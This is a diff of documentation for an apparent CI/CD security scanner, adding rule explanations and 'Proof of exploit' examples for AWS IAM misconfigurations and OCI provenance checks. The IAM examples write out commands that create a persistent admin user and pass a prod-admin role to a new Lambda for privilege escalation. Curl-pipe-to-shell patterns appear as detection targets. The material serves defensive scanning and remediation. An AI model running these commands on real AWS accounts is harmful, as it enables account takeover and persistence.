-- Bitwarden / npm install scripts (CVE-2018-7536-class incidents): remote-script execution in CI is the same primitive. The attacker controls bytes the runner executes. Pinning a digest or hosting a vendored copy turns a perpetual ambient risk into a one-time review.
+- [event-stream](https://github.com/dominictarr/event-stream/issues/116) (November 2018) and the [ua-parser-js compromise](https://github.com/faisalman/ua-parser-js/issues/536) (October 2021): npm-side examples of the same primitive. When the CI runner executes bytes a third party can swap out (via `curl | bash`, an unpinned `npm install`, or a compromised maintainer account), the attacker controls what runs with the runner's credentials in scope. Pinning a digest or vendoring a frozen copy turns a perpetual ambient risk into a one-time review.
 
 **Proof of exploit.**
 
@@ -2389,6 +2881,41 @@ v1 charts (HELM-001) are skipped. They predate ``Chart.lock`` and use ``requirem
 
 **Recommendation.** Replace AdministratorAccess with least-privilege policies.
 
+**Proof of exploit.**
+
+# Vulnerable: CodeBuild service role with AdministratorAccess.
+# (Terraform shown for clarity; the actual finding comes from
+# live ListAttachedRolePolicies on the role.)
+resource "aws_iam_role" "codebuild" {
+  name               = "codebuild-deploy"
+  assume_role_policy = data.aws_iam_policy_document.cb_trust.json
+}
+resource "aws_iam_role_policy_attachment" "admin" {
+  role       = aws_iam_role.codebuild.name
+  policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
+}
+
+# Attack: any compromise of the build (poisoned dependency,
+# leaked buildspec edit, malicious PR merged to the branch
+# CodeBuild trusts) runs as a principal with full account
+# permissions. From a build shell:
+#
+#   aws iam create-user --user-name persistence
+#   aws iam attach-user-policy --user-name persistence \
+#     --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+#   aws iam create-access-key --user-name persistence
+#
+# Game over: out-of-band admin, no IP gate, survives every
+# subsequent rotation of the CodeBuild role itself.
+
+# Safe: scope the role to the resources the pipeline actually
+# touches. ``AdministratorAccess`` is never the right answer
+# for an automation principal.
+resource "aws_iam_role_policy" "codebuild_least_priv" {
+  role   = aws_iam_role.codebuild.id
+  policy = data.aws_iam_policy_document.deploy_specific.json
+}
+
 **Source:** [`IAM-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
 #### `IAM-002`: CI/CD role has wildcard Action in attached policy <span class="pg-sev pg-sev--high">HIGH</span> { #detail-iam-002 }
@@ -2408,6 +2935,43 @@ v1 charts (HELM-001) are skipped. They predate ``Chart.lock`` and use ``requirem
 **How this is detected.** ``iam:PassRole`` with ``Resource: '*'`` lets the principal hand any role to any service. Combined with a service that runs your code (Lambda, ECS, CodeBuild, EC2 Instance Profiles), this is role-hop privilege escalation: launch an ephemeral resource configured with a higher-privileged role, run code under that identity, exfil. Scoping by ARN + ``iam:PassedToService`` removes the escalation path.
 
 **Recommendation.** Restrict iam:PassRole to specific role ARNs and add an iam:PassedToService condition.
+
+**Proof of exploit.**
+
+# Vulnerable: pipeline role grants PassRole with Resource: '*'.
+{
+  "Version": "2012-10-17",
+  "Statement": [{
+    "Effect": "Allow",
+    "Action": ["iam:PassRole", "lambda:CreateFunction",
+                "lambda:InvokeFunction"],
+    "Resource": "*"
+  }]
+}
+
+# Attack: from a build shell, create a Lambda configured with
+# the highest-privileged role you can name and invoke it:
+#
+#   aws lambda create-function --function-name pwn \
+#     --role arn:aws:iam::123456789012:role/prod-admin \
+#     --runtime python3.12 --handler i.h \
+#     --zip-file fileb://payload.zip
+#   aws lambda invoke --function-name pwn /tmp/out
+#
+# The Lambda now runs as ``prod-admin`` even though the
+# pipeline principal never had that role's permissions
+# directly. Classic role-hop privilege escalation.
+
+# Safe: pin to one role ARN AND require the pass be scoped
+# to the service that legitimately consumes it.
+{
+  "Effect": "Allow",
+  "Action": "iam:PassRole",
+  "Resource": "arn:aws:iam::123456789012:role/lambda-deploy-target",
+  "Condition": {
+    "StringEquals": {"iam:PassedToService": "lambda.amazonaws.com"}
+  }
+}
 
 **Source:** [`IAM-004`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
@@ -2511,7 +3075,7 @@ v1 charts (HELM-001) are skipped. They predate ``Chart.lock`` and use ``requirem
 
 **Evidences:** [`Build.L3.Isolated`](#ctrl-build-l3-isolated) Build L3: Build runs in an isolated environment not influenced by other builds.
 
-**How this is detected.** Recognises both `copyArtifacts(projectName: ...)` and the older `step([$class: 'CopyArtifact', ...])` form. If the upstream job accepts multibranch or PR builds, the artifact may have been produced by attacker-controlled code.
+**How this is detected.** Recognizes both `copyArtifacts(projectName: ...)` and the older `step([$class: 'CopyArtifact', ...])` form. If the upstream job accepts multibranch or PR builds, the artifact may have been produced by attacker-controlled code.
 
 **Recommendation.** Add a verification step before consuming the artifact: `sh 'sha256sum -c manifest.sha256'` against a manifest the producer signed, or `cosign verify` over the artifact directly. Restrict the upstream job to non-PR builds via branch protection if verification isn't feasible.
 
@@ -2639,6 +3203,35 @@ v1 charts (HELM-001) are skipped. They predate ``Chart.lock`` and use ``requirem
 
 **Source:** [`JF-031`](../providers/jenkins.md#jf-031) in the [Jenkins provider](../providers/jenkins.md).
 
+#### `OCI-001`: Image manifest is missing OCI provenance annotations <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-oci-001 }
+
+**Evidences:** [`Build.L1.Provenance`](#ctrl-build-l1-provenance) Build L1: Provenance describing how the artifact was produced is generated.
+
+**How this is detected.** Without these two annotations a pulled image can't be traced back to a source revision, so an incident-response team has no way to reach the build that produced it. The rule fires on whichever layer the manifest carries (top-level for an index, sub-manifest for a per-platform image); DF-016 catches the same gap at Dockerfile authoring time, OCI-001 catches it once the image has been built and any later ``docker buildx --annotation`` overrides have already been applied.
+
+**Recommendation.** Stamp the image with at least ``org.opencontainers.image.source`` (the URL of the source repo) and ``org.opencontainers.image.revision`` (the commit SHA built into the image). With ``docker buildx`` this is ``--label org.opencontainers.image.source=...`` plus ``--label org.opencontainers.image.revision=...`` at build time, or set them as image annotations through ``--annotation`` so they appear on the manifest itself (``manifest.annotations`` is what registries surface to ``manifest inspect``).
+
+**Known false positives.**
+
+- Throwaway / scratch images that never leave a developer's machine (e.g. ``image inspect`` of an intermediate build stage) don't need provenance annotations. Suppress via ignore-file rather than removing the rule.
+
+**Source:** [`OCI-001`](../providers/oci.md#oci-001) in the [OCI manifest provider](../providers/oci.md).
+
+#### `OCI-002`: Image is missing a build attestation manifest <span class="pg-sev pg-sev--high">HIGH</span> { #detail-oci-002 }
+
+**Evidences:** [`Build.L1.Provenance`](#ctrl-build-l1-provenance) Build L1: Provenance describing how the artifact was produced is generated, [`Build.L2.Signed`](#ctrl-build-l2-signed) Build L2: Provenance is authenticated and cannot be forged by tenants.
+
+**How this is detected.** Build attestations are the canonical place for SLSA provenance and SBOM data on an OCI image. A multi-platform image index that ships per-architecture manifests but no attestation-manifest sibling means there's no signed record of how the image was built or what's inside it, so consumers can't enforce SLSA Build-L2+ or feed an SBOM into vulnerability triage. A single-platform manifest (no image index) also fails this rule, attestations require the index-of-manifests shape that BuildKit produces by default.
+
+**Recommendation.** Build the image with ``docker buildx build --attest=type=provenance,mode=max --attest=type=sbom`` (or the equivalent BuildKit frontend flags). Both attestations land as sibling sub-manifests inside the image index, annotated with ``vnd.docker.reference.type: attestation-manifest`` and linked to their target manifest via ``vnd.docker.reference.digest``. Verify after pushing with ``docker buildx imagetools inspect <ref>``, the ``Attestations`` section should list both predicate types.
+
+**Known false positives.**
+
+- Intermediate / cache-only images pushed by CI for later-stage consumption may legitimately ship without attestations to keep build artifacts small. Suppress via ignore-file when this is the deliberate shape, the default expectation for any image that reaches a production registry is a full attestation set.
+- Some registries strip the attestation sub-manifests on pull (``docker pull`` of a single platform unwraps the index). If the JSON you're scanning came from ``docker manifest inspect`` rather than ``docker buildx imagetools inspect --raw``, attestations may be invisible even when present upstream.
+
+**Source:** [`OCI-002`](../providers/oci.md#oci-002) in the [OCI manifest provider](../providers/oci.md).
+
 #### `PBAC-001`: CodeBuild project has no VPC configuration <span class="pg-sev pg-sev--high">HIGH</span> { #detail-pbac-001 }
 
 **Evidences:** [`Build.L3.Isolated`](#ctrl-build-l3-isolated) Build L3: Build runs in an isolated environment not influenced by other builds.
@@ -2740,6 +3333,10 @@ v1 charts (HELM-001) are skipped. They predate ``Chart.lock`` and use ``requirem
 **Recommendation.** Replace ``curl ... | sh`` with a download-then-verify-then-execute pattern. Drop TLS-bypass flags (``curl -k``, ``git config http.sslverify false``); install the missing CA into the step image instead. Both forms let an attacker controlling DNS / a transparent proxy substitute the script the step runs.
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
+
+**Known false positives.**
+
+- Tasks running entirely against an internal mirror (``curl https://internal-mirror/install.sh | sh`` where the mirror is the same supply chain as the task image itself) carry less marginal risk than a public-internet fetch, but the rule still fires because the curl-pipe primitive is the structural signal. ``curl -k`` to a TLS endpoint with a known self-signed CA likewise triggers; the canonical fix is to install the CA into the step image and drop ``-k``, but per-task suppression via ``--ignore-file`` is the escape hatch.
 
 **Source:** [`TKN-008`](../providers/tekton.md#tkn-008) in the [Tekton provider](../providers/tekton.md).
 
